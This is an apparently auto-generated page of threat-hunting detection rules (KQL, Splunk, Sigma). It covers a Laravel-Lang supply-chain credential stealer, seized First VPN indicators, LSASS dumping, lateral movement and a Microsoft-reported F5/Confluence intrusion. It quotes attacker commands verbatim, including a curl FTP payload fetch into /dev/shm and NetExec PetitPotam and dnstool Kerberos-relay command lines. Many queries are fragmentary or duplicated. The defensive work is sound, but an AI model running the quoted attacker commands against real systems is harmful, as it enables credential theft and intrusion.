Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Composer install of malicious helpers.php in laravel-lang vendor package
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Supply Chain Attack Targets Laravel-Lang Packages with Credential Stealer
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] cscript.exe launching .vbs from .laravel_locale temp directory · [LLM] Stealer or VBS launcher dropped into .laravel_locale temp directory · Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] C2 egress to flipboxstudio.info from Laravel-Lang composer dropper · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains

[LLM] C2 egress to flipboxstudio.info from Laravel-Lang composer dropper Command & Control High
Detects any HTTP/DNS contact with the hard-coded C2 domain flipboxstudio.info (decoded from integer array in the malicious src/helpers.php). Both the /payload fetch (stage-2 stealer download) and /exfil (AES-256 encrypted credential exfil) hit the same FQDN, so any resolution or connection is unambiguously malicious. Rationale: Anchored on the article's named C2 domain flipboxstudio.info plus the /payload and /exfil URL paths quoted verbatim. Corroborated by https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities and https://gbhackers.com/malicious-laravel-packages/. Cross-checked against: • https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities • https://gbhackers.com/malicious-laravel-packages/ • https://cybersecuritynews.com/malicious-packages-disguised-as-laravel-utilities/
ATT&CKT1071.001 T1041 T1132.001

  | where Timestamp > ago(LookbackDays)
  | where RemoteUrl has C2Host or RemoteUrl has "flipboxstudio.info/payload" or RemoteUrl has "flipboxstudio.info/exfil"
  | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName,
            InitiatingProcessFileName, InitiatingProcessCommandLine,
            RemoteUrl, RemoteIP, RemotePort, ActionType
),
(
  DeviceEvents
  | where Timestamp > ago(LookbackDays)
  | where ActionType == "DnsQueryResponse" or ActionType == "InboundConnectionAccepted"
  | where AdditionalFields has C2Host
  | project Timestamp, DeviceName, AccountName,
            InitiatingProcessFileName, InitiatingProcessCommandLine,
            RemoteIP, AdditionalFields, ActionType
)
| order by Timestamp desc

),

  | where RequestURL has C2Host or DestinationHostName has C2Host
  | project TimeGenerated, SourceIP, DestinationIP, RequestURL, DestinationHostName, SourceUserName, RequestClientApplication
),

  | where Url has C2Host or HttpHostName has C2Host

| order by TimeGenerated desc

[LLM] cscript.exe launching .vbs from .laravel_locale temp directory Installation High
Detects the Windows arm of the Laravel-Lang dropper: the malicious src/helpers.php writes an 8-hex-character .vbs launcher into <temp>\.laravel_locale\ and executes it silently via cscript. Process tree is php/php-fpm/php-cgi (or anything that triggered composer autoload) → cscript.exe with a .vbs path containing `.laravel_locale`. Rationale: Anchored on two article-quoted strings together: `<tmp>/.laravel_locale/<8 random hex chars>.vbs` and the explicit `runs the payload silently via cscript` Windows-launcher behaviour. The 8-hex regex makes this near-zero-FP. Cross-checked against: • https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities • https://gbhackers.com/malicious-laravel-packages/
ATT&CKT1059.005 T1105 T1195.002
Data sourcesEndpoint.Processes
let LookbackDays = 14d;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where FileName =~ "cscript.exe" or FileName =~ "wscript.exe"
| where ProcessCommandLine has @".laravel_locale"
   and ProcessCommandLine matches regex @"(?i)\.laravel_locale[\\/][0-9a-f]{8}\.vbs"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFileName,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
let LookbackDays = 14d;
union isfuzzy=true
(
  SecurityEvent
  | where TimeGenerated > ago(LookbackDays)
  | where EventID == 4688
  | where NewProcessName endswith "\\cscript.exe" or NewProcessName endswith "\\wscript.exe"
  | where CommandLine has ".laravel_locale" and CommandLine matches regex @"(?i)\.laravel_locale[\\\\/][0-9a-f]{8}\.vbs"
  | project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
),
(
  ImProcessCreate
  | where TimeGenerated > ago(LookbackDays)
  | where ActingProcessName endswith "cscript.exe" or ActingProcessName endswith "wscript.exe"
  | where ActingProcessCommandLine has ".laravel_locale"
     and ActingProcessCommandLine matches regex @"(?i)\.laravel_locale[\\\\/][0-9a-f]{8}\.vbs"
  | project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName
)
| order by TimeGenerated desc

[LLM] Composer install of malicious helpers.php in laravel-lang vendor package Delivery Medium
Detects composer (or any file mover) writing a src/helpers.php file under vendor/laravel-lang/{lang,attributes,http-statuses}/ — the article confirms this file does not exist in the legitimate packages and was injected by the attacker via fork-tag commits. Catches the supply-chain payload at composer-install time, before the dropper detonates. Rationale: Anchored on the article-quoted file name (`src/helpers.php`) plus the three affected package names verbatim (`laravel-lang/lang`, `laravel-lang/attributes`, `laravel-lang/http-statuses`). The file is novel to the malicious tags, so any write is high-fidelity. Cross-checked against: • https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities • https://thehackernews.com/2026/03/fake-laravel-packages-on-packagist.html
ATT&CKT1195.002 T1059.004
Data sourcesEndpoint.Filesystem
let LookbackDays = 30d;
DeviceFileEvents
| where Timestamp > ago(LookbackDays)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FileName =~ "helpers.php"
| where FolderPath matches regex @"(?i)[\\\\/]vendor[\\\\/]laravel-lang[\\\\/](lang|attributes|http-statuses)[\\\\/]src[\\\\/]?$"
| project Timestamp, DeviceName, FolderPath, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessAccountName, SHA256
| order by Timestamp desc
let LookbackDays = 30d;
ImFileEvent
| where TimeGenerated > ago(LookbackDays)
| where EventType in ("FileCreated","FileModified","FileRenamed")
| where TargetFileName =~ "helpers.php"
| where TargetFilePath matches regex @"(?i)[\\\\/]vendor[\\\\/]laravel-lang[\\\\/](lang|attributes|http-statuses)[\\\\/]src[\\\\/]helpers\.php$"
| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, ActingProcessName, ActingProcessCommandLine, TargetFileSHA256

[LLM] Stealer or VBS launcher dropped into .laravel_locale temp directory Installation High
Detects file creation inside <temp>\.laravel_locale\ matching the article's exact naming patterns: 12-hex-character .php (the ~5,900-line stealer fetched from flipboxstudio.info/payload) or 8-hex-character .vbs (Windows cscript launcher). Catches the runtime dropper post-detonation, including the marker MD5 file that gates re-execution. Rationale: Anchored on the article's verbatim path patterns: `<tmp>/.laravel_locale/<md5_hash>` (32-hex marker), `<tmp>/.laravel_locale/<12 random hex chars>.php` (stealer body), `<tmp>/.laravel_locale/<8 random hex chars>.vbs` (Windows launcher). The directory name plus the hex-only filename regex makes near-zero-FP. Cross-checked with https://gbhackers.com/malicious-laravel-packages/. Cross-checked against: • https://socket.dev/blog/malicious-packagist-packages-disguised-as-laravel-utilities • https://gbhackers.com/malicious-laravel-packages/
ATT&CKT1105 T1036.005 T1140
Data sourcesEndpoint.Filesystem
let LookbackDays = 14d;
DeviceFileEvents
| where Timestamp > ago(LookbackDays)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FolderPath has @".laravel_locale" or FolderPath has @"/.laravel_locale/" or FolderPath has @"\\.laravel_locale\\"
| where (FileName matches regex @"(?i)^[0-9a-f]{12}\.php$")
     or (FileName matches regex @"(?i)^[0-9a-f]{8}\.vbs$")
     or (FileName matches regex @"(?i)^[0-9a-f]{32}$")
| project Timestamp, DeviceName, FolderPath, FileName, FileSize,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessAccountName, SHA256
| order by Timestamp desc
let LookbackDays = 14d;
ImFileEvent
| where TimeGenerated > ago(LookbackDays)
| where EventType in ("FileCreated","FileModified","FileRenamed")
| where TargetFilePath has ".laravel_locale"
| where (TargetFileName matches regex @"(?i)^[0-9a-f]{12}\.php$")
     or (TargetFileName matches regex @"(?i)^[0-9a-f]{8}\.vbs$")
     or (TargetFileName matches regex @"(?i)^[0-9a-f]{32}$")
| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, TargetFileName, TargetFileSize, ActingProcessName, ActingProcessCommandLine, TargetFileSHA256
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest

| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

   or NewProcessName endswith "\mshta.exe"

status: experimental

[LLM] Outbound connections to seized First VPN exit node IPs Command & Control High
Detects internal endpoints or perimeter devices initiating connections to the three U.S.-located First VPN exit-node IPs published by the FBI flash alert (2.223.66.103, 5.181.234.59, 92.38.148.58). Hits indicate prior use of the takedown-targeted criminal VPN — either by a malicious insider, a compromised host beaconing back through the old infrastructure, or law-enforcement sinkhole traffic worth triaging. Rationale: Uses the three exact U.S. exit-node IPs (2.223.66.103, 5.181.234.59, 92.38.148.58) named in the FBI flash alert quoted in the article. Static IPs published by law enforcement post-seizure are high-fidelity IOCs with effectively zero legitimate enterprise use. Cross-checked against: • https://www.europol.europa.eu/media-press/newsroom • https://www.ic3.gov/
ATT&CKT1090.003 T1572
Data sourcesNetwork_Traffic.All_Traffic
let exitNodes = dynamic(["2.223.66.103","5.181.234.59","92.38.148.58"]);

[LLM] Endpoint resolution or web traffic to seized 1vpns[.]com/net/org domains Command & Control High
Catches any internal host that resolves or browses to the three seized First VPN domains (1vpns.com / 1vpns.net / 1vpns.org). Post-takedown, any contact is either a forensic indicator of prior use, malware with stale C2/proxy config still beaconing, or an insider continuing to attempt access to the criminal service. Rationale: The three domains (1vpns.com, 1vpns.net, 1vpns.org) are quoted directly from the Eurojust seizure list in the article. Post-seizure these resolve to sinkholes or NX — any traffic from a corporate host is a confirmed historical-use signal worth alerting on. Cross-checked against: • https://www.eurojust.europa.eu/news • https://www.europol.europa.eu/media-press/newsroom
ATT&CKT1071.001 T1090.003

[LLM] Endpoint visits to Russian-speaking cybercrime forums Exploit.in / XSS.is Reconnaissance Medium
Detects internal hosts resolving or browsing to exploit.in and xss.is — the two Russian-speaking cybercrime forums named in the article as the marketing channels for First VPN. Used to surface insider threats, employees moonlighting in cybercrime, or compromised hosts being driven to acquire offensive tooling. Rationale: Both forums (exploit.in, xss.is) are named verbatim in the article as the Russian-speaking criminal marketplaces where First VPN was advertised. They have no legitimate corporate business purpose; access from a production endpoint is high-signal insider/compromise telemetry. Cross-checked against: • https://attack.mitre.org/techniques/T1588/002/ • https://www.recordedfuture.com/research
ATT&CKT1593.002 T1588.002

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |
    Anything opening lsass.exe with read-memory access that isn't a
    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1003.001
    - attack.credential-access
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
    filter_known_good:
        SourceImage|endswith:
            - '\MsSense.exe'
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\svchost.exe'
            - '\wininit.exe'
            - '\services.exe'
            - '\lsm.exe'
            - '\SearchProtocolHost.exe'
    condition: selection and not filter_known_good
falsepositives:
    - Third-party EDR / forensic tools — extend the filter list
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Remote service execution — PsExec / SMB lateral movement Actions on Objectives High
psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.
ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688            // process-create (audit-policy required)
| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that
    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:

From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence

Microsoft Security Blog
2026-05-22 15 use cases 17 techniques 6 kill-chain phases detected

A multi-stage attack on Linux devices began with an exposed F5 BIG-IP edge appliance and pivoted to an internal Confluence server for credential theft and identity compromise. Learn how the threat actor attempted Kerberos relay and lateral movement, and how Microsoft Defender detected, blocked, and unraveled the attack. The post From edge appliance to enterprise compromise: Multi-stage Linux intrusion via F5 and Confluence appeared first on Microsoft Security Blog .

Rationale: Anchors on the exact IP literal 206.189.27.39 from Microsoft's IOC list and the wget/curl downloader pattern shown verbatim in Block 2. [LLM] Linux curl FTP fetch writing payload into /dev/shm (tmpfs staging) Installation High
Detects curl invocations that fetch over ftp:// and write the output into /dev/shm/* — the exact pattern Microsoft observed when the actor bypassed Confluence host-level write blocks by serving a custom scanner over a Python ftplib FTP server and pulling it into shared memory. Rationale: Anchors on Block 3 verbatim: `curl -o /dev/shm/ag ftp://anonymous:anonymous@[REDACTED_LOCAL_IP]/5`. The ftp:// + /dev/shm/ combination is extremely rare in benign Linux ops — almost no legitimate package or admin tooling uses anonymous FTP into tmpfs.

[LLM] Confluence credential file access (server.xml / confluence.cfg.xml) by non-Confluence process Actions on Objectives High
Detects any process reading /opt/atlassian/confluence/conf/server.xml or /var/atlassian/application-data/confluence/confluence.cfg.xml where the actor is not Tomcat/Confluence itself. Microsoft observed the actor pulling DB credentials and JIRA service account creds from these two files after RCE, then using them for NTLM/Kerberos relay against AD. Rationale: Anchors on the two exact file paths Microsoft cites: `/opt/atlassian/confluence/conf/server.xml` and `/var/atlassian/application-data/confluence/confluence.cfg.xml`. These files store Confluence's DB connection strings (often containing the JiraServices/atlassian service account passwords later relayed against AD).

[LLM] NetExec/nxc PetitPotam coerce_plus with marshalled-target SMB payload Exploitation High
Detects invocation of NetExec (nxc) using the coerce_plus -M module with PetitPotam and the marshalled SPN target string (`localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`) — the exact authentication-coercion technique Microsoft observed prior to the CVE-2025-33073 relay. Rationale: Anchors on the verbatim NetExec command line from the article: `nxc smb [IP] -d ... -u Jiraservices -p '...' -M coerce_plus -o M=PetitPotam L="localhost1UWhRCAAAA..."`. The marshalled-target string `localhost1UWhRC` is the signature of CVE-2025-33073-style SPN spoofing — corroborated by BreakPoint Labs writeup of the exploit primitive. Cross-checked against: • https://breakpoint-labs.com/exploiting-the-reflective-kerberos-relay-flaw-cve-2025-33073/ • https://blog.syss.com/posts/kerberos-reflection/
ATT&CKT1187 T1557.001

DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has_any ("coerce_plus","M=PetitPotam","localhost1UWhRC")
   or (FileName in~ ("nxc","netexec") and ProcessCommandLine has "-M ")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessCommandLine has_any ("coerce_plus","M=PetitPotam","localhost1UWhRC")

| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName

[LLM] CVE-2025-33073 Reflective Kerberos Relay exploit script + dnstool DNS record injection Exploitation High
Detects execution of the public CVE-2025-33073 exploit (CVE-2025-33073.py) and/or krbrelayx's dnstool.py being used to add a DNS record containing the marshalled SPN string — the two-step combo Microsoft observed for the Kerberos reflection attack against an unpatched DC/member server. Rationale: Anchors on the literal `CVE-2025-33073.py` filename and `dnstool.py ... -a add -r localhost1UWhRCAAAA...` shown verbatim in the article. The marshalled-target SPN combined with DNS record add is the published exploit primitive — confirmed against BreakPoint Labs and SySS reflective-Kerberos writeups. Cross-checked against: • https://breakpoint-labs.com/exploiting-the-reflective-kerberos-relay-flaw-cve-2025-33073/ • https://blog.syss.com/posts/kerberos-reflection/ • https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073

[LLM] gowitness HTTP/HTTPS recon scan with Chrome SOCKS5 proxy on internal subnet Reconnaissance Medium
Detects execution of the `gowitness` web-screenshot tool (SHA256 57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517) with the article-specific argument pattern: `scan nmap`, `--write-screenshots`, `--screenshot-fullpage`, `--chrome-proxy socks5://`. Microsoft observed this as the actor's web-app inventory step before identifying the vulnerable Confluence server. Rationale: Anchors on Block 1 verbatim (`gowitness scan nmap -f $i --write-db --write-screenshots --screenshot-fullpage --open-only --service-contains http --delay 5 --threads 1 --chrome-proxy socks5://127.0.0.1:9090`) and the article-supplied SHA256 hash 57b3188e... for the gowitness binary the actor staged. The SOCKS5 proxy on 127.0.0.1:9090 is the actor's pivot for visiting internal web apps via the staging host.

   or SHA256 == "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine

| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, SHA256, ParentProcessName

status: experimental
description: gowitness invoked with --write-screenshots and --chrome-proxy socks5:// — the article-specific web-inventory pattern preceding Confluence RCE discovery

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2025-33073")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2025-33073")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2025-33073")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2025-33073")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity

status: experimental
description: |

    pivots over SMB. Pair with `wmic /node:` for the full cluster.

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
LSASS process access / dump (credential theft) Actions on Objectives High
